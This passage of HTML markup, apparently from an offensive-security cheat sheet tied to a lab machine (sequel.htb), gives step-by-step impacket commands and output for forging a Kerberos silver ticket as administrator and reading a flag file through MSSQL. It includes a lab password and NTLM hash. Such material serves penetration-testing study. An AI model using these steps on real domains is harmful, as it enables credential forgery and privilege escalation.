class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Domain SID: S-1-5-21-4078382237-1492182817-2568127209&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s 10.10.11.10 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getPac &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.sequel.htb/sql_svc:REGGIE1234ronnie&amp;#39;&lt;/span&gt; -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;KERB_VALIDATION_INFO &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LogonTime:                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwLowDateTime:                   4131845666 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwHighDateTime:                  31133135 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Domain SID: S-1-5-21-4078382237-1492182817-2568127209&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s 10.10.11.10 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getPac &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.sequel.htb/sql_svc&amp;#39;&lt;/span&gt; -hashes :1443EC19DA4DAC4FFC953BCA1B57B4CF -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;KERB_VALIDATION_INFO &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LogonTime:                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwLowDateTime:                   4131845666 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwHighDateTime:                  31133135 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Domain SID: S-1-5-21-4078382237-1492182817-2568127209&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s 10.10.11.10 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getPac &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.sequel.htb/sql_svc&amp;#39;&lt;/span&gt; -k -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;KERB_VALIDATION_INFO &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LogonTime:                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwLowDateTime:                   4131845666 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwHighDateTime:                  31133135 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Domain SID: S-1-5-21-4078382237-1492182817-2568127209&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4-generate-silver-ticket&#34;&gt;4. Generate Silver Ticket&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn anything/dc.sequel.htb administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Creating basic skeleton ticket and PAC Infos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Customizing ticket for sequel.htb/administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     PAC_LOGON_INFO&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     PAC_CLIENT_INFO_TYPE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EncTicketPart&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EncTGSRepPart&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Signing/Encrypting final ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     PAC_SERVER_CHECKSUM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     PAC_PRIVSVR_CHECKSUM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EncTicketPart&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EncTGSRepPart&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Specify group / user id&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;lt;SPN&amp;gt; -groups &amp;lt;GROUP_ID&amp;gt; -user-id &amp;lt;USER_ID&amp;gt; &amp;lt;SERVICE_ACCOUNT&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5-check&#34;&gt;5. Check&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Pass-the-ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=administrator.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;administrator.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Check&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;klist&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; klist&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Ticket cache: FILE:administrator.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Default principal: administrator@SEQUEL.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Valid starting     Expires            Service principal&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;09/25/24 07:55:27  09/23/34 07:55:27  anything/dc.sequel.htb@SEQUEL.HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        renew until 09/23/34 07:55:27&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;6-access-service&#34;&gt;6. Access Service&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; For example: mssql&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-mssqlclient -k &amp;lt;TARGET&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-mssqlclient -k dc.sequel.htb                                                &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Encryption required, switching to TLS&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &amp;#39;master&amp;#39;.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[!] Press help for extra shell commands&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SQL (sequel\Administrator  dbo@master)&amp;gt; SELECT * FROM OPENROWSET(BULK N&amp;#39;C:\users\administrator\desktop\root.txt&amp;#39;, SINGLE_CLOB) AS Contents&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;BulkColumn                                &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;---------------------------------------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 